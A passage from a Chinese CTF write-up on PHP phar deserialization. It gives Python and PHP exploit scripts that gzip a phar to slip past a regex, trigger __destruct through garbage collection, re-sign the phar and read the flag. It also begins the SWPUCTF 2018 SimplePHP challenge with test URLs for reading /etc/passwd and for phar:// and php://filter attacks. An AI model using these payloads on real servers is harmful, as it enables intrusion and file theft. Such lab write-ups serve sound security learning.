<p>还有一个思路就是把phar再压缩成压缩包</p>
<h4 id="phar文件打成压缩包（绕过正则）"><a href="#phar文件打成压缩包（绕过正则）" class="headerlink" title="phar文件打成压缩包（绕过正则）"></a><strong>phar文件打成压缩包</strong>（绕过正则）</h4><p>（gzip bzip2 tar zip 这四个后缀同样也支持phar:&#x2F;&#x2F;读取）</p>
<p>传输进去的就是二进制流乱码 就可以绕过正则匹配</p>
<p>用python脚本上传一下（因为是二进制数据）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import gzip</span><br><span class="line"> </span><br><span class="line">url=<span class="string">&quot;http://node4.anna.nssctf.cn:28134/&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">### 先将phar文件变成gzip文件</span></span><br><span class="line">with <span class="title function_ invoke__">open</span>(<span class="string">&quot;./1.phar&quot;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">    phar_zip=gzip.<span class="title function_ invoke__">open</span>(<span class="string">&quot;gzip.zip&quot;</span>,<span class="string">&#x27;wb&#x27;</span>)                  <span class="comment">#创建了一个gzip文件的对象</span></span><br><span class="line">    phar_zip.<span class="title function_ invoke__">writelines</span>(f1)                                <span class="comment">#将phar文件的二进制流写入</span></span><br><span class="line">    phar_zip.<span class="title function_ invoke__">close</span>()</span><br><span class="line"> </span><br><span class="line"><span class="comment">###写入gzip文件</span></span><br><span class="line">with <span class="title function_ invoke__">open</span>(<span class="string">&quot;gzip.zip&quot;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f2:</span><br><span class="line">    data1=&#123;<span class="number">0</span>:f2.<span class="title function_ invoke__">read</span>()&#125;           <span class="comment">#利用gzip后全是乱码绕过               </span></span><br><span class="line">    param1 = &#123;<span class="number">0</span>: <span class="string">&#x27;O:1:&quot;A&quot;:1:&#123;s:6:&quot;config&quot;;s:1:&quot;w&quot;;&#125;&#x27;</span>&#125;</span><br><span class="line">    p1 = requests.<span class="title function_ invoke__">post</span>(url=url, params=param1,data=data1)</span><br><span class="line"> </span><br><span class="line"><span class="comment">### 读gzip.zip文件，获取flag</span></span><br><span class="line">param2=&#123;<span class="number">0</span>:<span class="string">&#x27;O:1:&quot;A&quot;:1:&#123;s:6:&quot;config&quot;;s:1:&quot;r&quot;;&#125;&#x27;</span>&#125;</span><br><span class="line">data2=&#123;<span class="number">0</span>:<span class="string">&quot;phar://tmp/a.txt&quot;</span>&#125;</span><br><span class="line">p2=requests.<span class="title function_ invoke__">post</span>(url=url,params=param2,data=data2)</span><br><span class="line">flag=re.<span class="title function_ invoke__">compile</span>(<span class="string">&#x27;NSSCTF\&#123;.*?\&#125;&#x27;</span>).<span class="title function_ invoke__">findall</span>(p2.text)       </span><br><span class="line"><span class="keyword">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>返回是空</p>
<p>那么问题来了，为啥返回是空呢，按我们之前的思路应该是没问题的</p>
<p>其实是最后一段代码</p>
<p><img src="/../image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20250707183935311.png" alt="image-20250707183935311"></p>
<p>我们之前测试知道__destruct这个是在代码结束之后才会被执行的，可是到代码最后这段代码抛出异常，我们想要执行的destruct魔术方法就不会被执行</p>
<p>绕过异常方法就是让getflag对象反序列化完成之后提前触发GC机制</p>
<p>我们使用以下的方法</p>
<h4 id="构造序列化数组直接触发GC机制，绕过异常"><a href="#构造序列化数组直接触发GC机制，绕过异常" class="headerlink" title="构造序列化数组直接触发GC机制，绕过异常"></a>构造序列化数组直接触发GC机制，绕过异常</h4><p><strong>对phar文件进行处理：</strong></p>
<table>
<thead>
<tr>
<th><strong><code>a:2:&#123;i:0;O:7:&quot;getflag&quot;:&#123;&#125;i:0;N;&#125;</code></strong></th>
<th>强制让对象失去引用，触发 GC 回收</th>
</tr>
</thead>
</table>
<hr>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;i:0;O:7:&quot;getflag&quot;:&#123;&#125;i:0;N;&#125;</span><br></pre></td></tr></table></figure>

<p>怎么理解呢？这是一个数组，反序列化是按照顺序执行的，那么这个Array[0]首先是设置为getflag对象的，然后又将Array[0]赋值为NuLL，那么原来的getflag就没有被引用了，就会被GC机制回收从而触发__destruct方法</p>
<p><code>a:2:&#123;i:0;O:7:&quot;getflag&quot;:&#123;&#125;i:0;N;&#125;</code> 的完整解析：</p>
<ul>
<li><p><code>a:2</code>：一个包含 2 个元素的数组</p>
</li>
<li><p><code>&#123;...&#125;</code> 内的内容：</p>
<ul>
<li><code>i:0;O:7:&quot;getflag&quot;:&#123;&#125;</code> → 第1个元素（<code>Array[0]</code>）是一个 <code>getflag</code> 对象</li>
<li><code>i:0;N;</code> → 第2次操作：将 <code>Array[0]</code> 设为 <code>null</code></li>
</ul>
</li>
<li><p><strong>PHP 的 GC 机制</strong>：当一个对象<strong>失去所有引用</strong>时，会被标记为可回收</p>
</li>
<li><p><strong>反序列化的特殊性</strong>：</p>
<ul>
<li>整个过程发生在<strong>一个临时作用域</strong>中</li>
<li>没有外部变量引用反序列化的数组</li>
<li>因此 <code>getflag</code> 对象在失去 <code>$arr[0]</code> 的引用后，会<strong>立即被回收</strong></li>
</ul>
</li>
</ul>
<hr>
<p>重新生成phar文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); <span class="comment">// 将当前PHP文件的内容进行语法高亮并输出到页面上</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">getflag</span> // 定义一个名为 <span class="title">Testobj</span> 的类</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="comment">// 声明一个属性 $output，初始值为空字符串</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);   <span class="comment">// 删除之前的 test.phar 文件(如果有)，@ 符号用于抑制可能出现的文件不存在的警告</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);  <span class="comment">// 创建一个名为 test.phar 的 PHAR 文件对象</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();  <span class="comment">// 开始写入 PHAR 文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);  <span class="comment">// 使用 setStub 方法设置 PHAR 文件的启动器（stub），__HALT_COMPILER(); 是 PHP 的特殊标记，表示文件编译的结束</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">getflag</span>(); <span class="comment">// 创建了一个 Testobj 类的实例</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="variable">$o</span>,<span class="number">1</span>=&gt;<span class="literal">null</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">// 将 $o 对象作为元数据写入到 PHAR 文件中，这种方法不再安全，可能导致安全漏洞</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);  <span class="comment">// 向 PHAR 文件中添加一个名为 test.txt 的文件，文件内容为字符串 &quot;test&quot;</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>(); <span class="comment">// 停止写入 PHAR 文件</span></span><br></pre></td></tr></table></figure>

<h4 id="修改签名"><a href="#修改签名" class="headerlink" title="修改签名"></a>修改签名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;i:0;O:7:&quot;getflag&quot;:0:&#123;&#125;i:1;N;&#125;---》a:2:&#123;i:0;O:7:&quot;getflag&quot;:0:&#123;&#125;i:0;N;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20250707175129719.png" alt="image-20250707175129719"></p>
<p>但是我们一旦更改phar里的内容就要修改它的签名,然后这个phar文件才是完整的</p>
<p>我们用python代码来修改签名</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;./p12.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read() <span class="comment"># 修改内容后的phar文件</span></span><br><span class="line">s = f[:-<span class="number">28</span>] <span class="comment"># 获取要签名的数据</span></span><br><span class="line">h = f[-<span class="number">8</span>:] <span class="comment"># 获取签名类型以及GBMB标识</span></span><br><span class="line">newf = s+sha1(s).digest()+h <span class="comment"># 数据 + 签名 + 类型 + GBMB</span></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;ph2.phar&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).write(newf) <span class="comment"># 写入新文件</span></span><br></pre></td></tr></table></figure>

<h4 id="python脚本压缩文件，上传，读取，拿flag"><a href="#python脚本压缩文件，上传，读取，拿flag" class="headerlink" title="python脚本压缩文件，上传，读取，拿flag"></a>python脚本压缩文件，上传，读取，拿flag</h4><p>重新运行一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node4.anna.nssctf.cn:28577/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 先将phar文件变成gzip文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./ph2.phar&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">    phar_zip = gzip.<span class="built_in">open</span>(<span class="string">&quot;gzip.zip&quot;</span>, <span class="string">&#x27;wb&#x27;</span>)  <span class="comment"># 创建了一个gzip文件的对象</span></span><br><span class="line">    phar_zip.writelines(f1)  <span class="comment"># 将phar文件的二进制流写入</span></span><br><span class="line">    phar_zip.close()</span><br><span class="line"></span><br><span class="line"><span class="comment">###写入gzip文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;gzip.zip&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f2:</span><br><span class="line">    data1 = &#123;<span class="number">0</span>: f2.read()&#125;  <span class="comment"># 利用gzip后全是乱码绕过</span></span><br><span class="line">    param1 = &#123;<span class="number">0</span>: <span class="string">&#x27;O:1:&quot;A&quot;:1:&#123;s:6:&quot;config&quot;;s:1:&quot;w&quot;;&#125;&#x27;</span>&#125;</span><br><span class="line">    p1 = requests.post(url=url, params=param1, data=data1)</span><br><span class="line"></span><br><span class="line"><span class="comment">### 读gzip.zip文件，获取flag</span></span><br><span class="line">param2 = &#123;<span class="number">0</span>: <span class="string">&#x27;O:1:&quot;A&quot;:1:&#123;s:6:&quot;config&quot;;s:1:&quot;r&quot;;&#125;&#x27;</span>&#125;</span><br><span class="line">data2 = &#123;<span class="number">0</span>: <span class="string">&quot;phar://tmp/a.txt&quot;</span>&#125;</span><br><span class="line">p2 = requests.post(url=url, params=param2, data=data2)</span><br><span class="line"></span><br><span class="line">flag = re.<span class="built_in">compile</span>(<span class="string">&#x27;NSSCTF\&#123;.*?\&#125;&#x27;</span>).findall(p2.text)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>









<h3 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h3><p>收集信息</p>
<p>先随便上传一个文件侯点击查看文件，发现什么都没有，但是看到url，貌似是一个文件包含漏洞</p>
<p>尝试输入文件名，可以拿到文件源码?&#x2F;file&#x3D;index.php</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  <span class="keyword">include</span> <span class="string">&#x27;base.php&#x27;</span>; <span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>function.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__);  </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>;      </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);      <span class="comment">// 关闭所有错误报告</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 执行文件上传操作</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>;  <span class="comment">// 使用全局的$_FILES数组</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 生成新文件名：原文件名+客户端IP的MD5值，并强制使用.jpg扩展名</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>].<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; <span class="comment">//这里可以自己计算文件名</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建上传目录(已被注释掉)</span></span><br><span class="line">    <span class="comment">//mkdir(&quot;upload&quot;,0777); </span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果文件已存在则删除</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>)) &#123; <span class="comment">//文件都上传在这个目录下了，也可以直接访问/upload目录看文件名</span></span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 移动临时文件到上传目录</span></span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 文件上传主控制函数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>;  <span class="comment">// 使用全局的$_FILES数组</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">upload_file_check</span>()) &#123;  <span class="comment">// 先检查文件是否合法</span></span><br><span class="line">        <span class="title function_ invoke__">upload_file_do</span>();      <span class="comment">// 检查通过后执行上传</span></span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 检查上传文件是否合法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool 返回是否通过检查</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>;  <span class="comment">// 使用全局的$_FILES数组</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 允许的文件类型白名单</span></span><br><span class="line">    <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>); </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取文件扩展名</span></span><br><span class="line">    <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]); </span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>); </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$extension</span>)) &#123; </span><br><span class="line">        <span class="comment">// 空扩展名时的处理(已被注释掉)</span></span><br><span class="line">        <span class="comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// 检查扩展名是否在白名单中</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;  <span class="comment">// 通过检查</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// 文件类型不合法，弹出警告</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>file.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>; <span class="comment">// 引入自定义函数库（潜在风险点：需检查function.php内容）</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;    <span class="comment">// 引入类定义（潜在风险点：需检查class.php内容）</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/var/www/html/&#x27;</span>); <span class="comment">// 设置目录限制（安全措施）</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>] ? <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] : <span class="string">&quot;&quot;</span>;  <span class="comment">// 直接获取用户输入的file参数（高危风险点）</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$file</span>)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();  <span class="comment">// 实例化Show类（需检查class.php中的Show类定义）</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>)) &#123;  <span class="comment">// 文件存在检查（可能被绕过）</span></span><br><span class="line">    <span class="variable">$show</span>-&gt;source = <span class="variable">$file</span>;  <span class="comment">// 直接使用用户输入作为属性值（高危）</span></span><br><span class="line">    <span class="variable">$show</span>-&gt;<span class="title function_ invoke__">_show</span>();         <span class="comment">// 调用显示方法（需检查_show()实现）</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!-- ================= 安全审计标记 ================= --&gt;</span><br><span class="line"><span class="number">1</span>. 【高危】文件包含漏洞：</span><br><span class="line">   - 第<span class="number">5</span>行：直接使用<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]作为文件路径</span><br><span class="line">   - 第<span class="number">12</span>行：未过滤直接传递给<span class="title function_ invoke__">file_exists</span>()和Show类</span><br><span class="line"><span class="number">2</span>. 【中危】类方法风险：</span><br><span class="line">   - <span class="variable">$show</span>-&gt;<span class="title function_ invoke__">_show</span>()的实现需检查（可能在<span class="keyword">class</span>.php中）：</span><br><span class="line">       是否有限制协议（如phar:<span class="comment">//）</span></span><br><span class="line">       是否有目录穿越检查</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>. 【安全措施】：</span><br><span class="line">   - 第<span class="number">4</span>行：open_basedir限制目录访问</span><br><span class="line">   - 但可能被phar:<span class="comment">//等协议绕过</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>. 【漏洞利用链】：</span><br><span class="line">   <span class="keyword">if</span>(<span class="class"><span class="keyword">class</span> <span class="title">Show</span>存在<span class="title">__wakeup</span>或<span class="title">__toString</span>等魔术方法)</span></span><br><span class="line"><span class="class">     可能构造反序列化攻击（需结合<span class="title">class</span>.<span class="title">php</span>分析）</span></span><br><span class="line"><span class="class">5. 【测试<span class="title">POC</span>】：</span></span><br><span class="line"><span class="class">   <span class="title">http</span>://<span class="title">target</span>.<span class="title">com</span>/?<span class="title">file</span>=../../<span class="title">etc</span>/<span class="title">passwd</span>       # 目录穿越测试</span></span><br><span class="line"><span class="class">   <span class="title">http</span>://<span class="title">target</span>.<span class="title">com</span>/?<span class="title">file</span>=<span class="title">phar</span>://<span class="title">upload</span>/<span class="title">evil</span>.<span class="title">jpg</span> # 反序列化测试</span></span><br><span class="line"><span class="class">   <span class="title">http</span>://<span class="title">target</span>.<span class="title">com</span>/?<span class="title">file</span>=<span class="title">php</span>://<span class="title">filter</span>/<span class="title">convert</span>.<span class="title">base64</span>-<span class="title">encode</span>/<span class="title">resource</span>=<span class="title">config</span>.<span class="title">php</span> # 源码读取</span></span><br></pre></td></tr></table></figure>

<p>class.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span 